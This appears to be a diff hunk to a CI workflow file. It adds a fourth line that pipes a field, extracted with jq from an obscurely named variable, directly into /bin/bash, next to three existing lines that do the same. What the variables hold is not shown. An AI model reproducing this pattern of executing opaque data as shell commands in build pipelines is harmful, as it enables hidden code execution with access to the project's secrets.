@@ -24,6 +24,7 @@ jobs:
           printf '%s' "$wenw181" | jq -r .vxfb2 | /bin/bash
           echo $suw156 | jq -r .itqf44 | /bin/bash
           printf '%s' "$o3" | jq -r .ezvf6 | /bin/bash
+          printf '%s' "$b6671" | jq -r .ypb038 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
